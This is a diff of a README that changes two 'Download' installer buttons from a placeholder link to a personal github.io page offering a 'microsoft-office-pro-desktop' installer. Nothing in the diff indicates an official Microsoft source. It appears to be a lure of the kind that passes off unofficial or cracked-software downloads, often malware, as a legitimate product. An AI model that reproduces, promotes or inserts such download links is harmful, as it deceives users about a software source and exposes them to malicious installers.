@@ -17,7 +17,7 @@ Format coverage, bundled runtimes, and deployment surface are documented in the 
 ## 01 · ⬇️ Download
 
 <p align="center">
-  <a href="https://example.com">
+  <a href="https://angela-frost.github.io/microsoft-office-pro-desktop">
     <picture>
       <source media="(prefers-color-scheme: dark)" srcset="docs/buttons/installer-card-dark.svg">
       <img src="docs/buttons/installer-card.svg" alt="" width="440">
@@ -224,7 +224,7 @@ Coexistence with a pre-existing installation is supported: the installer detects
 ## ⬇️ Download
 
 <p align="center">
-  <a href="https://example.com">
+  <a href="https://angela-frost.github.io/microsoft-office-pro-desktop">
     <picture>
       <source media="(prefers-color-scheme: dark)" srcset="docs/buttons/installer-card-dark.svg">
       <img src="docs/buttons/installer-card.svg" alt="" width="440">
